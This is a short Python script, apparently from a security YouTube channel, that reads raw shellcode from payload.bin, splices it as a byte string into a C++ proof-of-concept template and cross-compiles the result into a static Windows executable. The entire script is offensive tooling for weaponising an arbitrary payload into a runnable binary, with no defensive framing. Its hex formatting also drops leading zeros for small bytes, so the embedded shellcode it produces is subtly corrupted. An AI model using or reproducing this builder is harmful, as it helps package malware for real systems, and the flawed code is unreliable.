import sys
import string
import os

def read_source():
	source = open("poc.cpp", "rt")
	data = source.read()
	return data
	source.close()

def read_shellcode():
	payload = open("payload.bin", "rb")
	data = payload.read()
	return data
	payload.close()

def main():
	
	print("Gemini Cyber Security @ https://www.youtube.com/@gemini_security")

	source = read_source()

	payload = read_shellcode()
	format_payload =  '"\\x' + '\\x'.join(hex(x)[2:] for x in payload) + '";'

	#print(source)
	#print(format_payload)

	new_code = source.replace('unsigned char shellcode[] = "";', 'unsigned char shellcode[] = ' + format_payload)

	#print(new_code)

	pwn = open("new-poc.cpp", "w+")
	pwn.write(new_code)
	pwn.close()

	os.system("x86_64-w64-mingw32-g++ --static new-poc.cpp -o poc.exe")

if __name__ == "__main__":
	main()

